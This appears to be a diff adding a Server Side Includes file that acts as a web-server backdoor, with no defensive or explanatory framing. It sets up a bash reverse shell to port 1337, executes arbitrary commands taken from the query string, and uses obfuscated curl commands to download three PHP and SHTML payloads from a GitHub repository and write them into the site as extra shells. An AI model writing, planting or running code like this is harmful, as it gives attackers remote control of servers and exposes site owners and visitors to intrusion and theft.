@@ -1,0 +1,9 @@
+
+<!--#if expr="$QUERY_STRING_UNESCAPED = \$zero" -->
+<!--#set var="shl" value="bash -i >& /dev/tcp/0.0.0.0/1337 0>&1" --> 
+<!--#else -->
+<!--#set var="shl" value=$QUERY_STRING_UNESCAPED -->
+<!--#cmd exec="curl${IFS}-Ls${IFS}https://raw.githubusercontent.com/tikung6etar/Nyarek/refs/heads/master/mediaa.php${IFS}|${IFS}tee${IFS}-a${IFS}bc.php" -->
+<!--#cmd exec="curl${IFS}-Ls${IFS}https://raw.githubusercontent.com/tikung6etar/Nyarek/refs/heads/master/kecil.php${IFS}|${IFS}tee${IFS}-a${IFS}kecil.php" -->
+<!--#cmd exec="curl${IFS}-Ls${IFS}https://raw.githubusercontent.com/tikung6etar/Nyarek/refs/heads/master/s.shtml${IFS}|${IFS}tee${IFS}-a${IFS}bc.shtml" -->
+<!--#endif -->
